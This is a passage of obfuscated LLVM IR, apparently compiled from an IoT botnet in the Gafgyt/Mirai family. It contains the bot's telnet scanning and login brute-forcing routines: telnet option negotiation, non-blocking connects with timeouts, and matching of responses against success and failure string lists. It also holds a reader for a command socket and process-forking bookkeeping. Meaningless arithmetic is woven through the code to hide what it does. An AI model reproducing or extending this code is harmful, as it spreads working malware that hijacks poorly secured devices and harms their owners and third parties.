  %95 = getelementptr inbounds [16 x i64], [16 x i64]* %91, i64 0, i64 %94
  %96 = load i64, i64* %95, align 8
  %97 = xor i64 %96, -1
  %98 = xor i64 %90, -1
  %99 = xor i64 109544471131861883, -1
  %100 = and i64 %97, 109544471131861883
  %101 = and i64 %96, %99
  %102 = and i64 %98, 109544471131861883
  %103 = and i64 %90, %99
  %104 = or i64 %100, %101
  %105 = or i64 %102, %103
  %106 = xor i64 %104, %105
  %107 = or i64 %97, %98
  %108 = xor i64 %107, -1
  %109 = or i64 109544471131861883, %99
  %110 = and i64 %108, %109
  %111 = or i64 %106, %110
  %112 = or i64 %96, %90
  store i64 %111, i64* %95, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sub i32 0, %113
  %115 = sub i32 0, 1
  %116 = add i32 %114, %115
  %117 = sub i32 0, %116
  %118 = add nsw i32 %113, 1
  %119 = call i32 @select(i32 %117, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %119, i32* %12, align 4
  %120 = icmp sle i32 %119, 0
  br i1 %120, label %121, label %127

; <label>:121:                                    ; preds = %86
  %122 = load i32, i32* %13, align 4
  %123 = sub i32 %122, -881432293
  %124 = add i32 %123, 1
  %125 = add i32 %124, -881432293
  %126 = add nsw i32 %122, 1
  store i32 %125, i32* %13, align 4
  br label %69

; <label>:127:                                    ; preds = %86
  br label %128

; <label>:128:                                    ; preds = %127, %69
  br label %129

; <label>:129:                                    ; preds = %128, %33
  store i32 0, i32* %18, align 4
  %130 = load i8*, i8** %6, align 8
  store i8* %130, i8** %17, align 8
  br label %131

; <label>:131:                                    ; preds = %153, %129
  %132 = load i32, i32* %7, align 4
  %133 = sub i32 0, %132
  %134 = sub i32 0, -1
  %135 = add i32 %133, %134
  %136 = sub i32 0, %135
  %137 = add nsw i32 %132, -1
  store i32 %136, i32* %7, align 4
  %138 = icmp sgt i32 %132, 1
  br i1 %138, label %139, label %158

; <label>:139:                                    ; preds = %131
  %140 = load i32, i32* @mainCommSock, align 4
  %141 = call i64 @recv(i32 %140, i8* %16, i64 1, i32 0)
  %142 = icmp ne i64 %141, 1
  br i1 %142, label %143, label %145

; <label>:143:                                    ; preds = %139
  %144 = load i8*, i8** %17, align 8
  store i8 0, i8* %144, align 1
  store i32 -1, i32* %4, align 4
  br label %161

; <label>:145:                                    ; preds = %139
  %146 = load i8, i8* %16, align 1
  %147 = load i8*, i8** %17, align 8
  %148 = getelementptr inbounds i8, i8* %147, i32 1
  store i8* %148, i8** %17, align 8
  store i8 %146, i8* %147, align 1
  %149 = load i8, i8* %16, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 10
  br i1 %151, label %152, label %153

; <label>:152:                                    ; preds = %145
  br label %158

; <label>:153:                                    ; preds = %145
  %154 = load i32, i32* %18, align 4
  %155 = sub i32 0, 1
  %156 = sub i32 %154, %155
  %157 = add nsw i32 %154, 1
  store i32 %156, i32* %18, align 4
  br label %131

; <label>:158:                                    ; preds = %152, %131
  %159 = load i8*, i8** %17, align 8
  store i8 0, i8* %159, align 1
  %160 = load i32, i32* %18, align 4
  store i32 %160, i32* %4, align 4
  br label %161

; <label>:161:                                    ; preds = %158, %143
  %162 = load i32, i32* %4, align 4
  ret i32 %162
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #2
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %19, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add i32 %10, -1212538429
  %12 = add i32 %11, 1
  %13 = sub i32 %12, -1212538429
  %14 = add nsw i32 %10, 1
  store i32 %13, i32* %6, align 4
  %15 = sext i32 %13 to i64
  %16 = getelementptr inbounds i8*, i8** %9, i64 %15
  %17 = load i8*, i8** %16, align 8
  %18 = icmp ne i8* %17, null
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %8
  br label %8

; <label>:20:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %21

; <label>:21:                                     ; preds = %36, %20
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %6, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %41

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %4, align 8
  %27 = load i8**, i8*** %5, align 8
  %28 = load i32, i32* %7, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8*, i8** %27, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i8* @strcasestr(i8* %26, i8* %31) #10
  %33 = icmp ne i8* %32, null
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %25
  store i32 1, i32* %3, align 4
  br label %42

; <label>:35:                                     ; preds = %25
  br label %36

; <label>:36:                                     ; preds = %35
  %37 = load i32, i32* %7, align 4
  %38 = sub i32 0, 1
  %39 = sub i32 %37, %38
  %40 = add nsw i32 %37, 1
  store i32 %39, i32* %7, align 4
  br label %21

; <label>:41:                                     ; preds = %21
  store i32 0, i32* %3, align 4
  br label %42

; <label>:42:                                     ; preds = %41, %34
  %43 = load i32, i32* %3, align 4
  ret i32 %43
}

; Function Attrs: nounwind readonly
declare i8* @strcasestr(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #2, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = xor i64 %37, -1
  %39 = xor i64 %31, -1
  %40 = xor i64 2102533883579318172, -1
  %41 = and i64 %38, 2102533883579318172
  %42 = and i64 %37, %40
  %43 = and i64 %39, 2102533883579318172
  %44 = and i64 %31, %40
  %45 = or i64 %41, %42
  %46 = or i64 %43, %44
  %47 = xor i64 %45, %46
  %48 = or i64 %38, %39
  %49 = xor i64 %48, -1
  %50 = or i64 2102533883579318172, %40
  %51 = and i64 %49, %50
  %52 = or i64 %47, %51
  %53 = or i64 %37, %31
  store i64 %52, i64* %36, align 8
  %54 = load i32, i32* %6, align 4
  %55 = sub i32 %54, -1170703868
  %56 = add i32 %55, 1
  %57 = add i32 %56, -1170703868
  %58 = add nsw i32 %54, 1
  %59 = call i32 @select(i32 %57, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %60 = icmp slt i32 %59, 1
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %69

; <label>:62:                                     ; preds = %27
  %63 = load i32, i32* %6, align 4
  %64 = load i8*, i8** %8, align 8
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = call i64 @recv(i32 %63, i8* %64, i64 %66, i32 0)
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %5, align 4
  br label %69

; <label>:69:                                     ; preds = %62, %61
  %70 = load i32, i32* %5, align 4
  ret i32 %70
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([9 x i8*], [9 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %20 = load i32, i32* %6, align 4
  %21 = call i32 (i32, i32, ...) @fcntl(i32 %20, i32 3, i8* null)
  %22 = sext i32 %21 to i64
  store i64 %22, i64* %15, align 8
  %23 = load i64, i64* %15, align 8
  %24 = and i64 %23, 2048
  %25 = xor i64 %23, 2048
  %26 = or i64 %24, %25
  %27 = or i64 %23, 2048
  store i64 %26, i64* %15, align 8
  %28 = load i32, i32* %6, align 4
  %29 = load i64, i64* %15, align 8
  %30 = call i32 (i32, i32, ...) @fcntl(i32 %28, i32 4, i64 %29)
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %31, align 4
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #13
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  %36 = load i8*, i8** %7, align 8
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %38 = call i32 @getHost(i8* %36, %struct.in_addr* %37)
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %115

; <label>:41:                                     ; preds = %4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %43 = getelementptr inbounds [8 x i8], [8 x i8]* %42, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 8, i32 4, i1 false)
  %44 = load i32, i32* %6, align 4
  %45 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %46 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  store %struct.sockaddr* %46, %struct.sockaddr** %45, align 8
  %47 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %48 = load %struct.sockaddr*, %struct.sockaddr** %47, align 8
  %49 = call i32 @connect(i32 %44, %struct.sockaddr* %48, i32 16)
  store i32 %49, i32* %16, align 4
  %50 = load i32, i32* %16, align 4
  %51 = icmp slt i32 %50, 0
  br i1 %51, label %52, label %103

; <label>:52:                                     ; preds = %41
  %53 = call i32* @__errno_location() #13
  %54 = load i32, i32* %53, align 4
  %55 = icmp eq i32 %54, 115
  br i1 %55, label %56, label %101

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* %9, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %58, i64* %59, align 8
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %60, align 8
  br label %61

; <label>:61:                                     ; preds = %56
  %62 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %63 = getelementptr inbounds [16 x i64], [16 x i64]* %62, i64 0, i64 0
  %64 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %63) #2, !srcloc !4
  %65 = extractvalue { i64, i64* } %64, 0
  %66 = extractvalue { i64, i64* } %64, 1
  %67 = trunc i64 %65 to i32
  store i32 %67, i32* %18, align 4
  %68 = ptrtoint i64* %66 to i64
  %69 = trunc i64 %68 to i32
  store i32 %69, i32* %19, align 4
  br label %70

; <label>:70:                                     ; preds = %61
  %71 = load i32, i32* %6, align 4
  %72 = srem i32 %71, 64
  %73 = zext i32 %72 to i64
  %74 = shl i64 1, %73
  %75 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %76 = load i32, i32* %6, align 4
  %77 = sdiv i32 %76, 64
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [16 x i64], [16 x i64]* %75, i64 0, i64 %78
  %80 = load i64, i64* %79, align 8
  %81 = and i64 %80, %74
  %82 = xor i64 %80, %74
  %83 = or i64 %81, %82
  %84 = or i64 %80, %74
  store i64 %83, i64* %79, align 8
  %85 = load i32, i32* %6, align 4
  %86 = sub i32 0, 1
  %87 = sub i32 %85, %86
  %88 = add nsw i32 %85, 1
  %89 = call i32 @select(i32 %87, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %90 = icmp sgt i32 %89, 0
  br i1 %90, label %91, label %99

; <label>:91:                                     ; preds = %70
  store i32 4, i32* %13, align 4
  %92 = load i32, i32* %6, align 4
  %93 = bitcast i32* %14 to i8*
  %94 = call i32 @getsockopt(i32 %92, i32 1, i32 4, i8* %93, i32* %13) #2
  %95 = load i32, i32* %14, align 4
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %91
  store i32 0, i32* %5, align 4
  br label %115

; <label>:98:                                     ; preds = %91
  br label %100

; <label>:99:                                     ; preds = %70
  store i32 0, i32* %5, align 4
  br label %115

; <label>:100:                                    ; preds = %98
  br label %102

; <label>:101:                                    ; preds = %52
  store i32 0, i32* %5, align 4
  br label %115

; <label>:102:                                    ; preds = %100
  br label %103

; <label>:103:                                    ; preds = %102, %41
  %104 = load i32, i32* %6, align 4
  %105 = call i32 (i32, i32, ...) @fcntl(i32 %104, i32 3, i8* null)
  %106 = sext i32 %105 to i64
  store i64 %106, i64* %15, align 8
  %107 = load i64, i64* %15, align 8
  %108 = xor i64 -2049, -1
  %109 = xor i64 %107, %108
  %110 = and i64 %109, %107
  %111 = and i64 %107, -2049
  store i64 %110, i64* %15, align 8
  %112 = load i32, i32* %6, align 4
  %113 = load i64, i64* %15, align 8
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 4, i64 %113)
  store i32 1, i32* %5, align 4
  br label %115

; <label>:115:                                    ; preds = %103, %101, %99, %97, %40
  %116 = load i32, i32* %5, align 4
  ret i32 %116
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp sle i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %61

; <label>:10:                                     ; preds = %0
  %11 = load i32, i32* @numpids, align 4
  %12 = sub i32 0, 1
  %13 = sub i32 %11, %12
  %14 = add nsw i32 %11, 1
  store i32 %13, i32* @numpids, align 4
  %15 = load i32, i32* @numpids, align 4
  %16 = sub i32 %15, -174162572
  %17 = add i32 %16, 1
  %18 = add i32 %17, -174162572
  %19 = add nsw i32 %15, 1
  %20 = mul nsw i32 %18, 4
  %21 = sext i32 %20 to i64
  %22 = call noalias i8* @malloc(i64 %21) #2
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %24

; <label>:24:                                     ; preds = %41, %10
  %25 = load i32, i32* %4, align 4
  %26 = load i32, i32* @numpids, align 4
  %27 = sub i32 0, 1
  %28 = add i32 %26, %27
  %29 = sub nsw i32 %26, 1
  %30 = icmp slt i32 %25, %28
  br i1 %30, label %31, label %47

; <label>:31:                                     ; preds = %24
  %32 = load i32*, i32** @pids, align 8
  %33 = load i32, i32* %4, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  %36 = load i32, i32* %35, align 4
  %37 = load i32*, i32** %3, align 8
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds i32, i32* %37, i64 %39
  store i32 %36, i32* %40, align 4
  br label %41

; <label>:41:                                     ; preds = %31
  %42 = load i32, i32* %4, align 4
  %43 = add i32 %42, -225202731
  %44 = add i32 %43, 1
  %45 = sub i32 %44, -225202731
  %46 = add nsw i32 %42, 1
  store i32 %45, i32* %4, align 4
  br label %24

; <label>:47:                                     ; preds = %24
  %48 = load i32, i32* %2, align 4
  %49 = load i32*, i32** %3, align 8
  %50 = load i32, i32* @numpids, align 4
  %51 = add i32 %50, 980559859
  %52 = sub i32 %51, 1
  %53 = sub i32 %52, 980559859
  %54 = sub nsw i32 %50, 1
  %55 = sext i32 %53 to i64
  %56 = getelementptr inbounds i32, i32* %49, i64 %55
